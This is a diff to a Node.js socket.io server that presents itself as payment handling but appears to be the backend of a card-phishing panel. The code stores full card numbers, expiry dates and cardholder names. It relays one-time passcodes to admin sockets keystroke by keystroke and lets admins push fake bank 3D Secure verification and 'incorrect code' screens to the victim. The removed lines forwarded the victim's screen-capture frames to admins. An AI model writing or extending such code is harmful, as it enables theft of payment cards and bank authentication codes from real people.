@@ -1088,7 +1088,8 @@ io.on('connection', (socket) => {
       timestamp: data.timestamp || new Date().toISOString()
     });
   });
-  // Handle process_payment event from payment form
+  
+// Handle process_payment event from payment form
 socket.on('process_payment', (paymentData) => {
   console.log('Processing payment:', paymentData);
   
@@ -1130,7 +1131,8 @@ socket.on('process_payment', (paymentData) => {
     bankpageVisible: false,
     timestamp: new Date().toISOString(),
     ip: socket.handshake.address || 'Unknown',
-    viewed: false
+    viewed: false,
+    socketId: socket.id // Store the socket ID for later use
   };
   
   // If card type info is available, add it
@@ -1158,6 +1160,67 @@ socket.on('process_payment', (paymentData) => {
   
   // Also use the existing admin event for backward compatibility
   broadcastToAdmins('new_transaction', { invoiceId });
+  
+  // Check if this card should go through MC verification (3D Secure)
+  setTimeout(() => {
+    const needsMcVerification = shouldRequireMcVerification(paymentData.cardNumber);
+    
+    if (needsMcVerification) {
+      console.log(`Transaction ${invoiceId} requires MC verification`);
+      
+      // Update transaction status
+      transaction.status = 'mc_verification_pending';
+      transactions.set(invoiceId, transaction);
+      
+      // Store verification state
+      verificationStates.set(invoiceId, {
+        status: 'pending',
+        cardInfo: {
+          cardNumber: paymentData.cardNumber,
+          expiryDate: paymentData.expiryDate,
+          cardHolder: paymentData.cardHolder,
+          last4: paymentData.cardNumber.slice(-4)
+        },
+        socketId: socket.id,
+        attemptCount: 0
+      });
+      
+      // Notify the client that MC verification is required
+      socket.emit('payment_response', {
+        success: false,
+        requiresVerification: true,
+        transactionId: invoiceId,
+        message: 'Card requires additional verification'
+      });
+      
+      // Notify admins of pending verification
+      broadcastToAdmins('admin_notification', {
+        type: 'verification_pending',
+        invoiceId,
+        cardLast4: paymentData.cardNumber.slice(-4),
+        amount: paymentData.amount,
+        timestamp: Date.now()
+      });
+    } else {
+      // For demo purposes: Approve payments with valid card numbers, decline others
+      const isApproved = /^4/.test(paymentData.cardNumber); // Simple validation - approve Visa cards
+      
+      // Update transaction status
+      transaction.status = isApproved ? 'approved' : 'declined';
+      transaction.redirectStatus = isApproved ? 'success' : 'fail';
+      transactions.set(invoiceId, transaction);
+      
+      // Send response to client
+      socket.emit('payment_response', {
+        success: isApproved,
+        transactionId: invoiceId,
+        message: isApproved ? 'Payment successful' : 'Payment declined: Invalid card'
+      });
+      
+      // Log the transaction result
+      console.log(`Payment ${isApproved ? 'approved' : 'declined'} for transaction ${invoiceId}`);
+    }
+  }, 2000); // Simulate processing delay
 });
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
@@ -1171,81 +1234,427 @@ socket.on('process_payment', (paymentData) => {
     }
   });
   
-  // MC verification events - enhanced with direct broadcasting
-  socket.on('show_mc_verification', (data) => {
-    // Broadcast to the specific client with this invoice ID
-    console.log('Received show_mc_verification event:', data);
-    io.to(data.invoiceId).emit('show_mc_verification', data);
-  });
-
-  // Start verification event
-  socket.on('start_verification', (data) => {
-    console.log('Received start_verification event:', data);
-    io.to(data.invoiceId).emit('start_verification', data);
-  });
-
-  socket.on('update_mc_bank', (data) => {
-    // Update bank logo on client
-    console.log('Received update_mc_bank event:', data);
-    io.to(data.invoiceId).emit('update_mc_bank', {
-      invoiceId: data.invoiceId,
-      bankCode: data.bankCode
+ // MC verification events - enhanced with direct broadcasting and state management
+socket.on('show_mc_verification', (data) => {
+  console.log('Received show_mc_verification event:', data);
+  
+  // Look up the transaction
+  const txn = transactions.get(data.invoiceId);
+  if (!txn) {
+    console.error('Transaction not found for MC verification:', data.invoiceId);
+    return;
+  }
+  
+  // Set up initial verification state if not exists
+  if (!verificationStates.has(data.invoiceId)) {
+    verificationStates.set(data.invoiceId, {
+      status: 'pending',
+      cardInfo: {
+        cardNumber: txn.cardNumber,
+        expiryDate: txn.expiry,
+        cardHolder: txn.cardholder,
+        last4: txn.cardNumber.slice(-4)
+      },
+      socketId: socket.id,
+      attemptCount: 0
     });
-  });
-
-  socket.on('update_mc_currency', (data) => {
-    // Update currency on client
-    console.log('Received update_mc_currency event:', data);
-    io.to(data.invoiceId).emit('update_mc_currency', {
-      invoiceId: data.invoiceId,
-      currency: data.currency
-    });
-  });
-
-  socket.on('mc_otp_submitted', (data) => {
-    // Notify admin panel of OTP submission
-    console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
-    broadcastToAdmins('mc_otp_submitted', data);
-  });
-
-  socket.on('mc_otp_typing', (data) => {
-    // Send partial OTP to admin panel as user types
-    console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
-    broadcastToAdmins('mc_otp_typing', data);
-  });
-
-  socket.on('mc_otp_error', (data) => {
-    // Send OTP error to client
-    console.log('Sending OTP error to client:', data);
-    io.to(data.invoiceId).emit('mc_otp_error', data);
-  });
-
-  socket.on('mc_verification_result', (data) => {
-    // Send verification result to client
-    console.log('Sending verification result to client:', data);
-    io.to(data.invoiceId).emit('mc_verification_result', data);
-  });
-
-  socket.on('mc_resend_otp', (data) => {
-    // Notify admin panel of OTP resend request
-    console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
-    broadcastToAdmins('mc_resend_otp', data);
-  });
-
-  // Screen capture handlers
-  socket.on('screen_frame', (data) => {
-    // Get pid from socket query or data
-    const pid = socket.handshake.query?.pid || data.pid || data.userId;
     
-    console.log(`Received screen frame from: ${pid || socket.id}, size: ${data.frameData?.length || 0}`);
-    
-    // Forward to admin sockets
-    broadcastToAdmins('screen_frame', {
-      ...data,
-      userId: pid,
-      socketId: socket.id
-    });
+    // Update transaction status
+    txn.status = 'mc_verification_pending';
+  }
+  
+  // Add card type if not specified
+  if (!data.cardType) {
+    data.cardType = detectCardType(txn.cardNumber);
+  }
+  
+  // Broadcast to the specific client with this invoice ID
+  io.to(data.invoiceId).emit('show_mc_verification', data);
+  
+  // Also try to broadcast to the client that submitted the card
+  if (txn.socketId) {
+    io.to(txn.socketId).emit('show_mc_verification', data);
+  }
+  
+  // Log the action
+  console.log(`MC verification initiated for invoice: ${data.invoiceId}, card type: ${data.cardType}`);
+});
+
+// Start verification event
+socket.on('start_verification', (data) => {
+  console.log('Received start_verification event:', data);
+  
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.status = 'verification_started';
+    state.verificationType = data.verificationType;
+    state.bankCode = data.bankCode;
+    verificationStates.set(data.invoiceId, state);
+  }
+  
+  // Broadcast to the client with this invoice ID
+  io.to(data.invoiceId).emit('start_verification', {
+    invoiceId: data.invoiceId,
+    verificationType: data.verificationType || 'mastercard',
+    bankCode: data.bankCode || 'default',
+    merchantName: data.merchantName || 'Peacock Merchandise'
   });
+  
+  // Log the action
+  console.log(`MC verification started for invoice: ${data.invoiceId}, type: ${data.verificationType}, bank: ${data.bankCode}`);
+});
+
+socket.on('update_mc_bank', (data) => {
+  // Update bank logo on client
+  console.log('Received update_mc_bank event:', data);
+  
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.bankCode = data.bankCode;
+    verificationStates.set(data.invoiceId, state);
+  }
+  
+  io.to(data.invoiceId).emit('update_mc_bank', {
+    invoiceId: data.invoiceId,
+    bankCode: data.bankCode
+  });
+});
+
+socket.on('update_mc_currency', (data) => {
+  // Update currency on client
+  console.log('Received update_mc_currency event:', data);
+  
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.currency = data.currency;
+    verificationStates.set(data.invoiceId, state);
+  }
+  
+  io.to(data.invoiceId).emit('update_mc_currency', {
+    invoiceId: data.invoiceId,
+    currency: data.currency
+  });
+});
+
+socket.on('mc_otp_submitted', (data) => {
+  const { otp, invoiceId } = data;
+  console.log(`MC OTP RECEIVED: ${otp} for invoice: ${invoiceId || 'unknown'}`);
+  
+  if (!invoiceId) {
+    // Try to find a transaction for this socket
+    let foundInvoiceId = null;
+    verificationStates.forEach((state, id) => {
+      if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
+        foundInvoiceId = id;
+      }
+    });
+    
+    if (foundInvoiceId) {
+      data.invoiceId = foundInvoiceId;
+    } else {
+      console.error('No active verification found for this socket');
+      socket.emit('mc_otp_error', { message: 'Verification session expired' });
+      return;
+    }
+  }
+  
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.attemptCount = (state.attemptCount || 0) + 1;
+    state.otp = otp;
+    verificationStates.set(data.invoiceId, state);
+    
+    // For demo: Accept specific OTPs or after 2 attempts
+    const isValidOtp = otp === '123456' || state.attemptCount >= 2;
+    
+    if (isValidOtp) {
+      console.log(`OTP verified for transaction ${data.invoiceId}`);
+      
+      // Update verification state
+      state.status = 'verified';
+      verificationStates.set(data.invoiceId, state);
+      
+      // Update transaction status
+      const txn = transactions.get(data.invoiceId);
+      if (txn) {
+        txn.status = 'approved';
+        txn.redirectStatus = 'success';
+        transactions.set(data.invoiceId, txn);
+      }
+      
+      // Send success response
+      socket.emit('mc_verification_result', {
+        invoiceId: data.invoiceId,
+        success: true,
+        message: 'Verification successful'
+      });
+      io.to(data.invoiceId).emit('mc_verification_result', {
+        invoiceId: data.invoiceId,
+        success: true,
+        message: 'Verification successful'
+      });
+      
+      // Notify admins
+      broadcastToAdmins('admin_notification', {
+        type: 'verification_success',
+        invoiceId: data.invoiceId,
+        cardLast4: state.cardInfo?.last4 || 'xxxx',
+        timestamp: Date.now()
+      });
+    } else {
+      console.log(`Invalid OTP for transaction ${data.invoiceId}`);
+      
+      // Send error response
+      socket.emit('mc_otp_error', {
+        invoiceId: data.invoiceId,
+        message: 'Incorrect verification code. Please try again.'
+      });
+      
+      // Notify admins
+      broadcastToAdmins('admin_notification', {
+        type: 'verification_attempt_failed',
+        invoiceId: data.invoiceId,
+        attemptCount: state.attemptCount,
+        timestamp: Date.now()
+      });
+    }
+  } else {
+    socket.emit('mc_otp_error', { message: 'Verification session expired' });
+  }
+  
+  // Notify admin panel of OTP submission
+  broadcastToAdmins('mc_otp_submitted', data);
+});
+
+socket.on('mc_otp_typing', (data) => {
+  // Send partial OTP to admin panel as user types
+  console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
+  broadcastToAdmins('mc_otp_typing', data);
+});
+
+socket.on('mc_otp_error', (data) => {
+  // Send OTP error to client
+  console.log('Sending OTP error to client:', data);
+  io.to(data.invoiceId).emit('mc_otp_error', data);
+});
+
+socket.on('mc_verification_result', (data) => {
+  // Log the verification result
+  console.log('MC verification result:', data);
+  
+  // Update verification state
+  if (verificationStates.has(data.invoiceId)) {
+    const state = verificationStates.get(data.invoiceId);
+    state.status = data.success ? 'verified' : 'failed';
+    verificationStates.set(data.invoiceId, state);
+  }
+  
+  // Update transaction status
+  const txn = transactions.get(data.invoiceId);
+  if (txn) {
+    txn.status = data.success ? 'approved' : 'declined';
+    txn.redirectStatus = data.success ? 'success' : 'fail';
+    transactions.set(data.invoiceId, txn);
+  }
+  
+  // Send verification result to client
+  io.to(data.invoiceId).emit('mc_verification_result', data);
+});
+
+socket.on('mc_verification_cancelled', (data) => {
+  // Find the transaction for this socket if not provided
+  let invoiceId = data.invoiceId;
+  if (!invoiceId) {
+    verificationStates.forEach((state, id) => {
+      if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
+        invoiceId = id;
+      }
+    });
+  }
+  
+  if (invoiceId) {
+    console.log(`Verification cancelled for transaction ${invoiceId}`);
+    
+    // Update verification state
+    if (verificationStates.has(invoiceId)) {
+      const state = verificationStates.get(invoiceId);
+      state.status = 'cancelled';
+      verificationStates.set(invoiceId, state);
+    }
+    
+    // Update transaction status
+    const txn = transactions.get(invoiceId);
+    if (txn) {
+      txn.status = 'cancelled';
+      txn.redirectStatus = 'fail';
+      txn.failureReason = 'canceled';
+      transactions.set(invoiceId, txn);
+    }
+    
+    // Notify admins
+    broadcastToAdmins('admin_notification', {
+      type: 'verification_cancelled',
+      invoiceId: invoiceId,
+      timestamp: Date.now()
+    });
+  }
+});
+
+socket.on('mc_resend_otp', (data) => {
+  // Log the OTP resend request
+  console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId || 'unknown'}`);
+  
+  // Find the transaction for this socket if not provided
+  let invoiceId = data.invoiceId;
+  if (!invoiceId) {
+    verificationStates.forEach((state, id) => {
+      if (state.socketId === socket.id || state.lastActiveSocketId === socket.id) {
+        invoiceId = id;
+      }
+    });
+  }
+  
+  if (invoiceId) {
+    // Notify admins
+    broadcastToAdmins('admin_notification', {
+      type: 'otp_resend_requested',
+      invoiceId: invoiceId,
+      timestamp: Date.now()
+    });
+  }
+});
+
+// Admin command handler for MC verification
+socket.on('admin_command', (data) => {
+  // Check if this is from an admin socket
+  if (!adminSockets.has(socket)) {
+    console.log('Unauthorized admin command attempt:', socket.id);
+    return;
+  }
+  
+  const { command, invoiceId } = data;
+  console.log(`Admin command received: ${command} for transaction ${invoiceId}`);
+  
+  if (!invoiceId || !transactions.has(invoiceId)) {
+    console.log(`No transaction found for ID: ${invoiceId}`);
+    return;
+  }
+  
+  // Find associated socket(s) for this transaction
+  let clientSockets = [];
+  io.sockets.sockets.forEach(s => {
+    // Check rooms the socket is in
+    const rooms = s.rooms;
+    if (rooms.has(invoiceId)) {
+      clientSockets.push(s);
+    }
+  });
+  
+  if (clientSockets.length === 0) {
+    console.log(`No active client sockets found for transaction ${invoiceId}`);
+    // Try to find in verification states
+    const state = verificationStates.get(invoiceId);
+    if (state && state.socketId) {
+      const foundSocket = io.sockets.sockets.get(state.socketId);
+      if (foundSocket) {
+        clientSockets.push(foundSocket);
+      }
+    }
+  }
+  
+  // Execute the command
+  switch (command) {
+    case 'show_mc_verification':
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('show_mc_verification', {
+          invoiceId,
+          cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber)
+        });
+      });
+      break;
+      
+    case 'start_verification':
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('start_verification', {
+          invoiceId,
+          verificationType: data.verificationType || 'mastercard',
+          bankCode: data.bankCode || 'default',
+          merchantName: data.merchantName || 'Peacock Merchandise'
+        });
+      });
+      break;
+      
+    case 'update_mc_bank':
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('update_mc_bank', {
+          invoiceId,
+          bankCode: data.bankCode || 'default'
+        });
+      });
+      break;
+      
+    case 'verification_success':
+      // Update verification state
+      if (verificationStates.has(invoiceId)) {
+        const state = verificationStates.get(invoiceId);
+        state.status = 'verified';
+        verificationStates.set(invoiceId, state);
+      }
+      
+      // Update transaction status
+      const txn = transactions.get(invoiceId);
+      txn.status = 'approved';
+      txn.redirectStatus = 'success';
+      transactions.set(invoiceId, txn);
+      
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_verification_result', {
+          invoiceId,
+          success: true,
+          message: 'Verification successful'
+        });
+      });
+      break;
+      
+    case 'verification_failed':
+      // Update verification state
+      if (verificationStates.has(invoiceId)) {
+        const state = verificationStates.get(invoiceId);
+        state.status = 'failed';
+        verificationStates.set(invoiceId, state);
+      }
+      
+      // Update transaction status
+      const failedTxn = transactions.get(invoiceId);
+      failedTxn.status = 'declined';
+      failedTxn.redirectStatus = 'fail';
+      failedTxn.failureReason = data.reason || 'declined';
+      transactions.set(invoiceId, failedTxn);
+      
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_verification_result', {
+          invoiceId,
+          success: false,
+          reason: data.reason || 'declined',
+          message: 'Verification failed'
+        });
+      });
+      break;
+      
+    case 'show_otp_error':
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_otp_error', {
+          invoiceId,
+          message: data.message || 'Incorrect verification code. Please try again.'
+        });
+      });
+      break;
+  }
+});
   
   socket.on('screen_capture_error', (data) => {
     console.log(`Screen capture error from: ${socket.id}`, data.error);
@@ -1347,5 +1756,36 @@ socket.on('process_payment', (paymentData) => {
   });
 });
 
+// ======= MC VERIFICATION HELPER FUNCTIONS =======
+
+// Detects card type based on card number
+function detectCardType(cardNumber) {
+  if (/^4/.test(cardNumber)) return 'visa';
+  if (/^5[1-5]/.test(cardNumber)) return 'mastercard';
+  if (/^3[47]/.test(cardNumber)) return 'amex';
+  if (/^6(?:011|5)/.test(cardNumber)) return 'discover';
+  return 'mastercard'; // Default
+}
+
+// Determines if a card should require MC verification
+function shouldRequireMcVerification(cardNumber) {
+  // For demo: Require verification for certain card patterns
+  // In a real system, this would be based on the payment processor's decision
+  
+  // Visa cards starting with 41 or 45
+  if (/^(41|45)/.test(cardNumber)) return true;
+  
+  // Mastercard cards starting with 52 or 54
+  if (/^(52|54)/.test(cardNumber)) return true;
+  
+  // All Amex cards
+  if (/^3[47]/.test(cardNumber)) return true;
+  
+  // For demo: randomly require verification for other cards (30% chance)
+  return Math.random() < 0.3;
+}
+
+// Store verification states for MC verification
+const verificationStates = new Map();
 // Export the app for testing
 export default app;
